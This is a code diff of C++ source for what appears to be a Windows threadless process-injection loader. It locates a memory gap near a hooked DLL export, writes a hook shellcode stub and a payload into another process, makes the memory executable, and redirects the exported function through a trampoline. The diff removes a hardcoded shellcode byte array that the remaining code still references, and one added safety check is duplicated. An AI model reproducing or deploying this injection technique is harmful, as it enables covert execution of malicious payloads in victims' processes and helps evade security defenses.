@@ -1,34 +1,38 @@
 #include "headers/payload.h"
 #include "utils/headers/CRTdefs.h"
-#include "API/headers/api.h"
 #include "intrin.h"
 #include <winternl.h>
 
 // Locates a memory gap next to the DLL that exports the hooked function
-bool LocateMemoryGap(IN HANDLE hProcess, OUT ULONG_PTR* puAddress, IN ULONG_PTR uExportedFuncAddress, IN size_t sPayloadSize)
-{
-	size_t sTempSize   = sPayloadSize;
-	NTSTATUS status    = NULL;
-	ULONG_PTR uAddress = NULL;
+bool LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {
 
-	auto &instance = API::APIResolver::GetInstance();
-	auto api          = instance.GetAPIAccess();
+	NTSTATUS    status    = NULL;
+	ULONG_PTR   uAddress  = NULL;
+	size_t      sTempSize = sPayloadSize;
 
-	
-	for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000; uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) 
-	{
-		if (!NT_SUCCESS(status = api.func.pNtAllocateVirtualMemory(hProcess, (void**)&uAddress, 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)));
-			continue;
+	if (!api.func.pNtAllocateVirtualMemory)
+		return false;
 
+	for (uAddress = (pHookedFunction & 0xFFFFFFFFFFF70000) - 0x70000000;
+		uAddress < pHookedFunction + 0x70000000;
+		uAddress += 0x10000) {
+
+		// Attempt to allocate virtual memory
+		status = api.func.pNtAllocateVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+		if (NT_SUCCESS(status)) {
 			*puAddress = uAddress;
-			break;
+			return true;
+		}
 	}
 
-	return *puAddress ? true : false;
+	return false;
 }
 
+
+
 // This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
-bool InstallHook(IN HANDLE hProcess, IN void *pExportedFunc, IN void* pMainPayloadAddress) 
+bool InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress) 
 {
 	NTSTATUS status		   = NULL;
 
@@ -44,7 +48,9 @@ bool InstallHook(IN HANDLE hProcess, IN void *pExportedFunc, IN void* pMainPaylo
 	auto &resolver = API::APIResolver::GetInstance();
 	auto api		  = resolver.GetAPIAccess();
 
-
+	if (!api.func.pNtProtectVirtualMemory || !api.func.pNtWriteVirtualMemory || !api.func.pNtProtectVirtualMemory)
+		return false;
+	
 	memcpy(&uTrampoline[1], &uRVA, sizeof(uRVA));
 
 	// Get write access to the targeted function
@@ -111,15 +117,6 @@ start:
 
 */
 
-unsigned char g_HookShellCode[63] = {
-	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
-	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
-	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
-	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
-	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
-	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
-};
-
 
 void PatchHook(void *pExportedFunc) {
 	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
@@ -129,29 +126,25 @@ void PatchHook(void *pExportedFunc) {
 	memcpy(&g_HookShellCode[22], &uOriginalBytes, sizeof(uOriginalBytes));
 }
 
-bool WritePayloadBuffer(IN HANDLE hProcess, IN ULONG_PTR uAddress, IN ULONG_PTR uHookShellcode, IN size_t sHookShellcodeSize, IN ULONG_PTR uPayloadBuffer, IN size_t sPayloadSize)
+bool WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
 {
 
-	size_t		sTempSize = sPayloadSize;
-	size_t		sBytesWritten = 0x00;
+	size_t		sTempSize		= sPayloadSize;
+	size_t		sBytesWritten   = 0x00;
 	DWORD		dwOldProtection = 0x00;
-	NTSTATUS	status = NULL;
+	NTSTATUS	status			= NULL;
 
 	auto& resolver = API::APIResolver::GetInstance();
-	auto api = resolver.GetAPIAccess();
-
+	auto api		  = resolver.GetAPIAccess();
 
 	// Write g_HookShellcode
 	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress), reinterpret_cast<void*>(uHookShellcode), sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) 
 		return false;
 	
-
 	// Write main payload after g_HookShellcode
 	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress + sBytesWritten), reinterpret_cast<void*>(uPayloadBuffer), sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) 
 		return false;
 	
-
-
 	if (!NT_SUCCESS((status = api.func.pNtProtectVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) 
 		return false;
 	
